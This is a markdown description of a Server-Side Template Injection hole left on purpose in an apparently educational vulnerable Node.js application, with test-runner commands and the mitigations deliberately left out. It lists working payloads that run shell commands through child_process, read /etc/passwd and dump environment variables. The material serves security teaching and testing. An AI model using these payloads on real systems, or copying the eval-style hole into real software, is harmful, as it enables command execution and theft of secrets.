# Server-Side Template Injection (SSTI) Vulnerability

This document describes the Server-Side Template Injection vulnerability implemented in the application and how to test it.

## Overview

The application's template rendering feature is vulnerable to SSTI attacks, allowing attackers to:
- Execute arbitrary system commands
- Access the file system
- Read sensitive information
- Make network requests

## Test Cases

### Running Tests

Use `devops/test.sh` with the following patterns:

```bash
# 1. Run all vulnerability tests
./devops/test.sh

# 2. Run all tests for a specific vulnerability type
./devops/test.sh ssti    # Run all SSTI tests
./devops/test.sh ssrf    # Run all SSRF tests

# 3. Run specific test case for a vulnerability
./devops/test.sh ssti test_03_code_execution   # Test command execution
./devops/test.sh ssti test_04_file_system_access   # Test file system access
./devops/test.sh ssti test_06_sensitive_data_access   # Test sensitive data access
```

### Test Cases Overview

1. `test_01_template_endpoints_exist`: Verifies that all required template endpoints exist and work correctly
2. `test_02_basic_template_rendering`: Tests basic template variable substitution
3. `test_03_code_execution`: Demonstrates arbitrary command execution via template injection
4. `test_04_file_system_access`: Shows ability to read sensitive files like `/etc/passwd`
5. `test_06_sensitive_data_access`: Accesses sensitive application data like environment variables

### Vulnerability Examples

1. Basic Template Rendering:
```javascript
${(() => "Hello World")()}
```

2. Command Execution:
```javascript
// Execute echo command
${(() => require("child_process").execSync("echo test").toString())()}

// Get user context
${(() => require("child_process").execSync("id").toString())()}
```

3. File System Access:
```javascript
// Read sensitive file
${(() => require("fs").readFileSync("/etc/passwd", "utf8"))()}

// List directory contents
${(() => require("child_process").execSync("ls -la /").toString())()}
```

4. Sensitive Data Access:
```javascript
// Access environment variables
${(() => JSON.stringify(process.env))()}

// Get Node.js process info
${(() => JSON.stringify({version: process.version, arch: process.arch, platform: process.platform}))()}
```

## Impact

The SSTI vulnerability allows attackers to:
1. Execute arbitrary commands with root privileges
2. Access sensitive system files
3. Read environment variables and application secrets
4. Monitor system resources and processes
5. Potentially pivot to other systems in the network

## Mitigation (Not Implemented)

For educational purposes, the following mitigations are intentionally NOT implemented:
1. Input validation and sanitization
2. Template sandboxing
3. Restricted execution context
4. Proper template engine configuration
5. Least privilege principle 